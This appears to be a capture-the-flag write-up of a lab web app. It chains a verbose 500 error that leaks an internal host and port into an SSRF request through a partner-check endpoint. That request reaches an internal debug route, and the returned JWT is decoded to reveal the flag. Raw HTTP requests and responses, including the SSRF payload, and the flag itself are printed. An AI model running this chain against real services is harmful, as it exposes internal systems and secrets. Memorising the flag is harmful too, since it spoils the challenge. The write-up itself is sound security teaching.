# Information Disclosure — Internal Service Details Exposed via Verbose Error Message

## Summary
Sending a malformed (empty) multipart request to the document upload endpoint causes the application to return a `500 Internal Server Error` whose JSON body includes a `debug_context` object. This object leaks internal infrastructure details — including an internal hostname, internal port,  that should never be exposed to a client.

## Affected Endpoint
```
POST /api/documents/upload
Host: 16.16.228.207:5000
```


## Steps to Solve

1. Authenticate as a normal user and obtain a valid Bearer token (role: `user` was sufficient — no elevated privileges required).
2. Send a `multipart/form-data` POST request to `/api/documents/upload` **without** the required `document` file part (i.e., an empty/malformed multipart body).

### Request
```http
POST /api/documents/upload HTTP/1.1
Host: 16.16.228.207:5000
Content-Length: 44
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymGqR7usAqcKkXoeM
Authorization: Bearer <redacted-jwt>
Accept: */*
Origin: http://16.16.228.207:8081
Referer: http://16.16.228.207:8081/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,en-KE;q=0.8
Connection: keep-alive

------WebKitFormBoundarymGqR7usAqcKkXoeM--
```

### Response
```http
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: Werkzeug/3.1.9 Python/3.12.15
Date: Wed, 28 Oct 2026 12:35:31 GMT
Content-Type: application/json
Content-Length: 215
Access-Control-Allow-Origin: http://16.16.228.207:8081
Vary: Origin
Connection: close
Server-Timing: cfReqDur;dur=252.923
Cf-Team: 32241b43400004808cc8568400000001

{
  "debug_context": {
    "audit_token": "17a6388130cd9754",
    "internal_service_host": "internal-service",
    "internal_service_port": "6000"
  },
  "detail": "missing 'document' part in multipart body",
  "error": "upload processing failed"
}
```

## Pointers
The unhandled exception path for malformed multipart uploads appears to be caught by a generic error handler that serializes internal debugging context (`debug_context`) directly into the client-facing JSON response. This suggests:
- Flask/Werkzeug `DEBUG` mode may be enabled in production, **or**
- A custom exception handler intentionally (but insecurely) includes internal diagnostic data in error responses.

The server stack is identifiable as **Werkzeug/3.1.9, Python/3.12.15** from the `Server` header, which itself is a minor information disclosure compounding the issue.



# Chained Finding: SSRF via `/api/partner/check` → Internal Debug Endpoint Disclosure

## Summary
The information disclosure above leaked an internal hostname and port (`internal-service:6000`). A separate endpoint, `/api/partner/check`, accepts an attacker-controlled `partner_status_url` and performs a server-side request to it with no allow-listing or validation. By supplying the internal service's debug endpoint as the target URL, the application proxies back its response — including a JWT that contains the CTF flag in plaintext within its payload.

## Affected Endpoint
```
POST /api/partner/check
Host: 16.16.228.207:5000
```

## Vulnerability Class
**Server-Side Request Forgery (SSRF)** — chained with the earlier information disclosure to reach an internal-only debug endpoint that should not be reachable from outside the internal network.

## Exploit Chain
1. **Recon (Finding 1):** Trigger the malformed-multipart error on `/api/documents/upload` to leak `internal_service_host` (`internal-service`) and `internal_service_port` (`6000`).
2. **SSRF (Finding 2):** Submit that internal host/port as the `partner_status_url` parameter to `/api/partner/check`. The backend fetches the URL server-side (bypassing any network segmentation that would otherwise block a client from reaching it directly) and returns the response body to the client.
3. **Target the internal debug route:** Point the SSRF at `/internal/debug` specifically, which returns a JWT.
4. **Flag extraction:** Decode the returned JWT payload (base64url, standard JWT structure — not base62) to reveal the `flag` claim.

### Request
```http
POST /api/partner/check HTTP/1.1
Host: 16.16.228.207:5000
Content-Length: 68
Content-Type: application/json
Authorization: Bearer <redacted-jwt>
Accept: */*
Origin: http://16.16.228.207:8081
Referer: http://16.16.228.207:8081/
Connection: keep-alive

{"partner_status_url":"http://internal-service:6000/internal/debug"}
```

### Response
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.12.15
Content-Type: application/json
Content-Length: 219
Access-Control-Allow-Origin: http://16.16.228.207:8081

{
  "body": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZWJ1ZyI6dHJ1ZSwiZmxhZyI6ImZsYWd7aW5tX3lvdV9hcmVfYV9ncmVhdF9mdXp6ZXJ9IiwiaWF0IjoxNzkzMTkxMTA5fQ.vL0CKgmIdxbMfypqL6hprRLJWHaTn0uObbKL9u6kzN0"
  },
  "status_code": 200
}
```

### Flag Extraction
The `token` value is a standard three-part JWT (`header.payload.signature`). Base64url-decoding the **payload** segment (the middle part) yields a JSON object containing a `flag` claim directly — no further decoding (and no base62) is required:

```json
{
  "debug": true,
  "flag": "flag{inm_you_are_a_great_fuzzer}",
  "iat": 1793191109
}
```

